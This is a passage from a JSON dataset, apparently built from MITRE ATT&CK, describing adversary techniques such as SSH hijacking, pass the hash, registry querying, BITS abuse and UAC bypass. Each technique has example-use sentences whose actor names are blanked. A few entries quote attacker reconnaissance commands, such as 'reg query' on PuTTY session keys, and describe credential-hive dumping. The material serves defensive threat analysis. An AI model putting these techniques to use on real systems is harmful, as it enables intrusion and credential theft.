    "description": "Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
    "example_uses": [],
    "id": "T1184",
    "name": "SSH Hijacking",
    "similar_words": [
      "SSH Hijacking"
    ]
  },
  "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b": {
    "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi hosts backdoor, regardless of network segmentation or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)",
    "example_uses": [
      "has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.",
      "Some  variants use raw TCP for C2.",
      "can be configured to use raw TCP or UDP for command and control.",
      "is capable of using ICMP, TCP, and UDP for C2.",
      "The  malware platform can use ICMP to communicate between infected computers.",
      "can communicate using SOCKS.",
      "uses a custom TCP protocol for C2.",
      "binds to a raw socket on a random source port between 31800 and 31900 for C2.",
      "network traffic can communicate over a raw socket.",
      "C2 traffic can communicate via TCP raw sockets.",
      "completes network communication via raw sockets.",
      "If  does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number,  will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.",
      "network traffic communicates over a raw socket.",
      "communicates via ICMP for C2.",
      "An  downloader establishes SOCKS5 connections for its initial C2.",
      "has used a custom binary protocol over port 443 for C2 traffic.",
      "has used ICMP in C2 communications.",
      "Some variants of  use SSL to communicate with C2 servers.",
      "has used TCP in C2 communications.",
      "has the ability to use TCP and UDP for communication.",
      "has used a custom JSON-based protocol for its C&C communications.",
      "has the ability to use TCP and UDP in C2 communications.",
      "can use ICMP to receive information on the destination server.",
      "can forward TCP packets between the C2 and a remote host.",
      "can use TCP to communicate with command and control servers.",
      "uses ICMP for transmitting configuration information to and from its command and control server.",
      "can function as a stand-alone backdoor communicating over the `/tmp/clientsDownload.sock` socket.",
      "uses SSL to encrypt its communication with its C2 server.",
      "can communicate through custom methodologies for UDP ICMP and TCP that use distinct sessions to ride over the legitimate protocols.",
      "can use TCP to communicate between its agent and client modules.",
      "has used TCP to download additional modules.",
      "can use raw TCP for C2.",
      "has used ICMP custom TCP and UDP in outbound communications.",
      "can communicate with C2 using a custom binary protocol.",
      "can establish an indirect and raw TCP socket-based connection to the C2 server.",
      "can use TCP in C2 communications.",
      "has used raw TCP for C2.",
      "is capable of using ICMP TCP and UDP for C2.",
      "can communicate using custom TCP.",
      "communicates with a simple network protocol over TCP.",
      "During  threat actors used the Unix socket and a reverse TCP shell for C2 communications.",
      "During the   proxied C2 communications within a TLS-based tunnel.",
      "can use TCP for C2 communications.",
      "supports WebSocket and TCP-based C2 profiles.",
      "can establish a TCP connection as part of its initial connection to the C2.",
      "has sent its public key to the C2 server over TCP.",
      "has the ability to use TCP sockets to send data and ICMP to ping the C2 server.",
      "can use a proxy module to forward TCP packets to external hosts.",
      "During  the threat actors used TCP for some C2 communications.",
      "has used a passive backdoor that receives commands with UDP packets.",
      "The  communication module can use a custom protocol based on TLS over TCP.",
      "has a command built in to use a raw TCP socket.",
      "can use TCP for C2 communication.",
      "has used an encrypted protocol within TCP segments to communicate with the C2.",
      "has used UDP for C2 communications.",
      "has the ability to communicate with C2 with TCP over port 443.",
      "variants have the ability to communicate with C2 servers using ICMP or TCP.",
      "uses TCP and UDP for C2.",
      "If  does not detect a proxy configured on the infected machine it will send beacons via UDP/6000. Also after retrieving a C2 IP address and Port Number  will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.",
      "uses a custom binary protocol over sockets for C2 communications.",
      "has used raw sockets for network communication.",
      "has the ability use TCP to send or receive C2 packets.",
      "uses a custom binary protocol using a type length value format over TCP.",
      "provides access to the system via SSH or any other protocol that uses PAM to authenticate.",
      "has used TCP for C2.",
      "has used the Intel Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.",
      "can be configured to use TCP ICMP and UDP for C2 communications.",
      "During  threat actors used a custom protocol for command and control.",
      "The  C2 mechanism is based on TCP and UDP packets.",
      "can communicate with its C2 server via TCP over port 5200.",
      "has the ability to use TCP for external C2.",
      "has used Metasploit Bind and Reverse TCP stagers.",
      "has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.",
      "establishes a TCP socket for C2 communication using the API `WSASocketW`.",
      "can use TCP in communications with C2.",
      "has used TCP for C2 communications.",
      "can use TCP and KCP (KERN Communications Protocol) over UDP for C2 communication.",
      "can communicate with C2 over TCP and UDP.",
      "can communicate with actor-controlled C2 servers by using a custom little-endian binary protocol.",
      "can communicate over TCP TCP stream multiplexing KERN Communications Protocol (KCP) QUIC and UDP.",
      "uses socket-based tunneling utilities for command and control purposes such as NetCat and Go Simple Tunnel (GOST). These tunnels are used to push interactive command prompts over the created sockets.  has also used reverse TCP connections from Meterpreter installations to communicate back with C2 infrastructure.",
      "command and control traffic uses a non-standard likely custom protocol for communication.",
      "can use sockets for communications to its C2 server.",
      "can ping a specific C2 URL with the ID of a victim machine in the subdomain.",
      "can use JSON over WebSockets for C2 communications.",
      "used a non-standard TCP session to initialize communication prior to establishing HTTPS command and control.",
      "can monitor incoming C2 communications sent over TCP to the compromised host.",
      "can create multiple TCP connections for a single session.",
      "communicated over TCP 5000 from adversary administrative servers to adversary command and control nodes during .",
      "spawns a reverse TCP shell following an HTTP-based negotiation.",
      "can use the Windows Socket networking library to communicate with attacker-controlled endpoints.",
      "can tunnel TCP sessions into targeted networks."
    ],
    "id": "T1095",
    "name": "Non-Application Layer Protocol",
    "similar_words": [
      "Standard Non-Application Layer Protocol",
      "Non-Application Layer Protocol"
    ]
  },
  "attack-pattern--c23b740b-a42b-47a1-aec2-9d48ddd547ff": {
    "description": "Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. \n\nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting)",
    "example_uses": [
      "SEKURLSA::Pth module can impersonate a user, with only a password hash, to execute arbitrary commands.",
      "can perform pass the hash.",
      "can perform pass the hash.",
      "used Kerberos ticket attacks for lateral movement.",
      "has used pass the hash for lateral movement.",
      "The  group is known to have used pass the hash."
    ],
    "id": "T1075",
    "name": "Pass the Hash",
    "similar_words": [
      "Pass the Hash"
    ]
  },
  "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896": {
    "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "example_uses": [
      "queried the Registry to identify victim information.",
      "checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.",
      "checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information.",
      "queries the Registry for specific keys for potential privilege escalation and proxy information.",
      "gathers information about the Registry.",
      "searches for certain Registry keys to be configured before executing the payload.",
      "can enumerate Registry values, keys, and data.",
      "queries Registry values as part of its anti-sandbox checks.",
      "enumerates Registry keys associated with event logs.",
      "gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.",
      "A  tool can read and decrypt stored Registry values.",
      "checks the system for certain Registry keys.",
      "accesses the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.",
      "enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
      "uses the command reg query “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings”.",
      "creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.",
      "can enumerate Registry keys.",
      "contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.",
      "is capable of enumerating Registry keys and values.",
      "may query the Registry by running reg query on a victim.",
      "queries the registry to look for information about Terminal Services.",
      "has used reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default” on a victim to query the Registry.",
      "queries the Registry to determine the correct Startup path to use for persistence.",
      "searches and reads the value of the Windows Update Registry Run key.",
      "may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.",
      "can enumerate registry keys.",
      "is capable of enumerating and making modifications to an infected system's Registry.",
      "provides access to the Windows Registry, which can be used to gather information.",
      "queries Registry keys in preparation for setting Run keys to achieve persistence.",
      "queries several Registry keys to identify hard disk partitions to overwrite.",
      "can query for information contained within the Windows Registry.",
      "can gather Registry values.",
      "malware attempts to determine the installed version of .NET by querying the Registry.",
      "malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another  malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.",
      "surveys a system upon check-in to discover information in the Windows Registry with the reg query command.",
      "During  the threat actors executed `/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\` to detect recent PuTTY sessions likely to further lateral movement.",
      "uses the rem reg query command to obtain values from Registry keys.",
      "has queried the registry for proxy server information.",
      "can get user agent strings for the default browser from HKCU\\Software\\Classes\\http\\shell\\open\\command.",
      "creates a backdoor through which remote attackers can retrieve system information such as CPU speed from Registry keys.",
      "can search for the `HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System` Registry key to gather system information.",
      "has used a tool to query the Registry for proxy settings.",
      "checked that HKU\\SOFTWARE\\Microsoft\\CTF existed before decoding its embedded payload.",
      "A variant of  hooks lsass.exe and lsass.exe then checks the Registry for the data value 'rdpproto' under the key SYSTEM\\CurrentControlSet\\Control\\Lsa Name.",
      "can query `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid` to retrieve the machine GUID.",
      "can check for installed software on the system under the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall.",
      "has the ability to enumerate Registry keys including KEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir to search for a bitcoin wallet.",
      "can read specific registry values.",
      "can access the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.",
      "has executed the reg query command for HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default.",
      "queries the Registry for keys and values.",
      "has used shellcode which reads code stored in the registry keys \\REGISTRY\\SOFTWARE\\Microsoft\\DRM using the native Windows API as well as read HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces as part of its C2.",
      "enumerates values in the Registry.",
      "malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present including SecureCRT Terminal Services RealVNC TightVNC UltraVNC Radmin mRemote TeamViewer FileZilla pcAnyware and Remote Desktop. Another  malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.",
      "can query the Registry to get random file extensions to append to encrypted files.",
      "can query the Registry for keys added to execute COM hijacking.",
      "backdoor can query the Windows Registry to gather system information.",
      "can enumerate and query for information contained within the Windows Registry.",
      "has queried the Registry to identify victim information.",
      "can search the registry of a compromised host.",
      "queries the Registry for specific keys for potential privilege escalation and proxy information.  has also used WMI to query the Windows Registry.",
      "surveys a system upon check-in to discover information in the Windows Registry with the reg query command.  has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .",
      "can query the Registry to check for the presence of HKCU\\Software\\KasperskyLab.",
      "can query the netsvc group value data located in the svchost group Registry key.",
      "can query the Registry on compromised hosts using RegQueryValueExA.",
      "has used `check_registry_keys` as part of its environmental checks.",
      "has obtained specific Registry keys and values on a compromised host.",
      "can query the Registry typically `HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds` to find the key and path to decrypt and load its kernel driver and kernel driver loader.",
      "can collect the RegisteredOwner RegisteredOrganization and InstallDate registry values.",
      "can query Windows\\CurrentVersion\\Uninstall for installed applications.",
      "can use the `GetRegValue` function to check Registry keys within `HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated` and `HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU HKLM HKCR and HKCC hives.",
      "can query the Registry to determine if it has already been installed on the system.",
      "can enumerate Registry keys with all subkeys and values.",
      "can use the RegEnumKeyW to iterate through Registry keys.",
      "has checked for the existence of a Service key to determine if it has already been installed on the system.",
      "contains watchdog functionality that periodically ensures HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load is set to point to its executable.",
      "can check `Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings` to extract the `ProxyServer` string.",
      "has searched the Image File Execution Options registry key for Debugger within every subkey.",
      "can query HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\ to determine if the security setting for restricting default programmatic access is enabled.",
      "can query the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI to see if the value `OracleOcilib` exists.",
      "checks for specific registry keys related to the UCOMIEnumConnections and IActiveScriptParseProcedure32 interfaces.",
      "can query the host's Registry key at HKEY_CURRENT_USER\\Console\\QuickEdit to retrieve data.",
      "can read data from the Registry including from `HKLM\\Software\\NFC\\IPA` and`HKLM\\Software\\NFC\\`.",
      "can search the registry files of a compromised host.",
      "has used  to query the Registry for installed programs.",
      "has used the RegQueryValueExA function to retrieve proxy information in the Registry.",
      "can check the Registry for specific keys.",
      "can use the Registry for code updates and to collect credentials.",
      "can query the Registry for its configuration information.",
      "can check the default browser by querying HKCR\\http\\shell\\open\\command.",
      "has looked in the registry to find the default browser path.",
      "has accessed Registry hives ntuser.dat and UserClass.dat.",
      "uses the command reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings.",
      "has used various strains of malware to query the Registry.",
      "can query `SOFTWARE\\Microsoft\\.NETFramework\\policy\\v2.0` for discovery.",
      "has queried Registry keys using reg query \\\\<host>\\HKU\\<SID>\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\\\<host>\\HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.",
      "executes the reg query command to obtain information in the Registry.",
      "can open random files and Registry keys to obscure malware behavior from sandbox analysis.",
      "searches the Registry for indicators of security programs.",
      "collected the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid from compromised hosts.",
      "checks for the existence of a Registry key and if it contains certain values.",
      "queried registry values to determine items such as configured RDP ports and network configurations.",
      "has identified the OS product name from a compromised host by searching the registry for `SOFTWARE\\MICROSOFT\\Windows NT\\ CurrentVersion | ProductName`.",
      "has queried the Registry on compromised systems `reg query hklm\\software\\` for information on installed software.",
      "can check the Registry for the presence of HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate to determine how long it has been installed on a host.",
      "has used reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default on a victim to query the Registry.",
      "can search registry keys to identify antivirus programs on an compromised host.",
      "has the ability to retrieve information from the Registry.",
      "has the ability to query the Registry to detect a key specific to VMware.",
      "has the ability to enumerate `Uninstall` registry values.",
      "provides access to the Windows Registry which can be used to gather information.",
      "has a data wiper component that enumerates keys in the Registry HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services.",
      "can check for existing stratum cryptomining information in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr  %stratum info%.",
      "has opened the registry and performed query searches.",
      "can enumerate Registry values keys and data.",
      "can enumerate Registry items.",
      "queries the Windows Registry to fingerprint the infected host via the `HKLM:\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid` key.",
      "used  to dump the Security Account Manager (SAM) System and Security Windows registry hives from victim machines.",
      "has queried the Registry on compromised systems `reg query hklm\\software\\` for information on installed software including PuTTY.",
      "has used a service account to extract copies of the `Security` Registry hive.",
      "enumerates the Registry specifically the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options` key.",
      "queried registry values to determine system language settings.",
      "queries registry values for stored configuration information.",
      "has queried the following registry key to check for installed Chrome extensions: ` HKCU\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist`.",
      "has run commands such as `reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\[service name]\\Parameters` to verify if installed implants are running as a service."
    ],
    "id": "T1012",
    "name": "Query Registry",
    "similar_words": [
      "Query Registry"
    ]
  },
  "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd": {
    "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
    "example_uses": [
      "exfiltrates data in compressed chunks if a message is larger than 4096 bytes .",
      "exfiltrates command output and collected files to its C2 server in 1500-byte blocks.",
      "splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.",
      "uploads data in 2048-byte chunks.",
      "actors have split RAR files for exfiltration into parts.",
      "has split archived files into multiple parts to bypass a 5MB limit.",
      "During  the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.",
      "can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.",
      "can exfiltrate data to the C2 server in 27-character chunks.",
      "can break large files of interest into smaller chunks to prepare them for exfiltration.",
      "has divided files if the size is 0x1000000 bytes or more.",
      "will break large data sets into smaller chunks for exfiltration.",
      "can upload a file via HTTP POST response to the C2 split into 102400-byte portions.  can also download data from the C2 which is split into 81920-byte portions.",
      "supports custom chunk sizes used to upload/download files.",
      "The  chunker overlay supports splitting large files in smaller chunks during upload to circumvent size limits.",
      "has split archived exfiltration files into chunks smaller than 1MB.",
      "During  the threat actors limited 's bandwidth setting during exfiltration.",
      "transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.",
      "has split victims' files into chunks for exfiltration.",
      "can split exfiltrated data that exceeds 1.33 MB in size into multiple random sized parts between 384 and 512 KB.",
      "can be configured to exfiltrate files at a specified rate to evade network detection mechanisms."
    ],
    "id": "T1030",
    "name": "Data Transfer Size Limits",
    "similar_words": [
      "Data Transfer Size Limits"
    ]
  },
  "attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39": {
    "description": "Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the winrm command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)",
    "example_uses": [
      "has used WinRM to enable remote execution.",
      "can use WinRM to execute a payload on a remote host."
    ],
    "id": "T1028",
    "name": "Windows Remote Management",
    "similar_words": [
      "Windows Remote Management"
    ]
  },
  "attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02": {
    "description": "Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)\n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\n### Unquoted Paths\nService paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\"). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)\n\n### PATH Environment Variable Misconfiguration\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\\system32 (e.g., C:\\Windows\\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if C:\\example path precedes C:\\Windows\\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\\example path will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.\n\n### Search Order Hijacking\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).",
    "example_uses": [
      "contains a collection of Privesc-PowerUp modules that can discover and exploit various path interception opportunities in services, processes, and variables."
    ],
    "id": "T1034",
    "name": "Path Interception",
    "similar_words": [
      "Path Interception"
    ]
  },
  "attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0": {
    "description": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.",
    "example_uses": [
      "binds and listens on port 1058.",
      "uses port 46769 for C2.",
      "opens a backdoor on TCP ports 6868 and 7777.",
      "uses port 52100 and 5876 for C2 communications.",
      "has used a variant of NanoCore RAT that communicates with its C2 server over port 6666.",
      "uses ports 447 and 8082 for C2 communications.",
      "A  variant can use port 127 for communications.",
      "has used ports 8060 and 8888 for C2.",
      "malware has communicated with its C2 server over ports 4443 and 3543.",
      "Some  variants use port 8088 for C2.",
      "A  module has a default C2 port of 13000.",
      "can use port 995 for C2.",
      "communicates with its C2 server over TCP port 3728.",
      "C2 servers communicated with malware over TCP 8081, 8282, and 8083.",
      "Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes uncommonly used ports such as 995, 1816, 465, 1521, 3306, and many others.",
      "An  downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81."
    ],
    "id": "T1065",
    "name": "Uncommonly Used Port",
    "similar_words": [
      "Uncommonly Used Port"
    ]
  },
  "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7": {
    "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",
    "example_uses": [
      "has used bitsadmin.exe to download additional tools.",
      "can download a hosted \"beacon\" payload using .",
      "A  variant downloads the backdoor payload via the BITS service.",
      "can use BITS Utility to connect with the C2 server.",
      "has used BITS jobs to download malicious payloads.",
      "has been downloaded via Windows BITS functionality.",
      "can download a hosted beacon payload using .",
      "has used BITSadmin to download and execute malicious DLLs.",
      "takes advantage of the /SetNotifyCmdLine option in  to ensure it stays running on a system to maintain persistence.",
      "can use BITS jobs to download its malicious payload.",
      "has used  to download additional tools.",
      "has used the BITS protocol to exfiltrate stolen data from a compromised host.",
      "can be used to create  to launch a malicious process.",
      "used  to download and install payloads.",
      "has used batch scripts that utilizes WMIC to execute a  transfer of a ransomware payload to each compromised machine."
    ],
    "id": "T1197",
    "name": "BITS Jobs",
    "similar_words": [
      "BITS Jobs"
    ]
  },
  "attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be": {
    "description": "Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* eventvwr.exe can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)\n\nAnother bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)",
    "example_uses": [
      "performs UAC bypass.",
      "An older variant of  performs UAC bypass.",
      "A  tool can use a public UAC bypass method to elevate privileges.",
      "uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.",
      "has bypassed UAC.",
      "has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe.",
